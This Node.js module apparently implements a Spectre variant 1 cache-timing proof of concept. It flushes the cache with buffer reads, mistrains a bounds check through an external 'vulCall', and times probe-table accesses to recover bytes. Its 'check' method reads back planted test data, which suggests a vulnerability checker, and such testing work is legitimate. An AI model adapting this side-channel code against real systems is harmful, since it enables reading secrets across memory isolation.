/* eslint no-unused-vars: 0*/

const util = require('./util.js'),
	memory = require('./memory.js');

class Leak {

	constructor(num) {
		this.cacheSize = num * 1024 * 1024;
		this.offset = 64;
		this.buffer = Buffer.alloc(this.cacheSize);
	}

	clflush(size) {
		for (let i = 0; i < ((size) / this.offset); i++) {
			this.current = this.buffer.readUInt32BE(i * this.offset);
		}
	}

	readMemoryByte(maliciousX) {
		let simpleByteArrayLength = 16;
		let TABLE1_STRIDE = 0x1000;
		let CACHE_HIT_THRESHOLD = 80;// 0
		let results = new Uint32Array(257);
		let simpleByteArray = new Uint8Array(this.probeTable.buffer);
		let tries = 0;
		let junk = 0;
		let j = -1;
		let k = -1;
		for (tries = 99; tries > 0; tries--) {
			let trainingX = tries % simpleByteArrayLength;
			this.clflush(this.cacheSize);

			let time3 = this.time.start();
			junk = simpleByteArray[0];
			let time4 = this.time.now();

			for (let v = 29; v >= 0; v--) {
				for (let z = 0; z < 100; z++) {
					// wait
				}
				let x = ((v % 6) - 1) & ~0xFFFF;
				x = (x | (x >> 16));
				x = trainingX ^ (x & (maliciousX ^ trainingX));
				this.memory.vulCall(x, v);
			}

			for (let i = 0; i < 256; i++) {
				let mixI = i;
				let timeS = this.time.start();
				junk = this.probeTable[(mixI * TABLE1_STRIDE)];
				let timeE = this.time.now();
				if (timeE - timeS <= CACHE_HIT_THRESHOLD && mixI !== simpleByteArray[tries % simpleByteArrayLength]) {
					results[mixI]++;
				}
			}

			for (let i = 0; i < 256; i++) {
				if (j < 0 || results[i] >= results[j]) {
					k = j;
					j = i;
				} else if (k < 0 || results[i] >= results[k]) {
					k = i;
				}
			}
			if (results[j] >= (2 * results[k] + 5) || (results[j] === 2 && results[k] === 0)) {
				break;
			}
		}

		results[256] ^= junk;
		return [j, k, results[j], results[k]];
	}

	readMemoryByteWrapper(maliciousX) {
		let rlt = this.readMemoryByte(maliciousX);

		if (rlt[0] !== 0) {
			return rlt[0];
		}

		this.clflush(this.cacheSize);
		let comRlt = this.readMemoryByte(maliciousX);
		if (comRlt[1] === rlt[1] || comRlt[0] === rlt[1]) {
			return rlt[1];
		} else if (comRlt[0] === 0 || comRlt[1] === 0) {
			return comRlt[0];
		}

		return -1;
	}

	check(dataArray) {
		let TABLE1_BYTES = 0x3000000;
		this.probeTable = new Uint8Array(TABLE1_BYTES);

		this.clflush(this.cacheSize);
		this.time = new util.Time();
		this.memory = memory(global, {}, this.probeTable.buffer);
		let cnt = 0;

		this.memory.init();
		for (let i = 0; i < 0x1000; i++) {
			this.memory.vulCall(1, 0);
			this.clflush(64);
		}

		let simpleByteArray = new Uint8Array(this.probeTable.buffer);
		for (let i = 0; i < dataArray.length; i++) {
			simpleByteArray[0x2200000 + i] = dataArray[i];
		}

		let result = [];
		for (let i = 0; i < dataArray.length; i++) {
			result[i] = {
				key: (0x2200000 + i),
				data: this.readMemoryByteWrapper(0x2200000 + i)
			};
		}

		return result;
	}

}

module.exports = Leak;
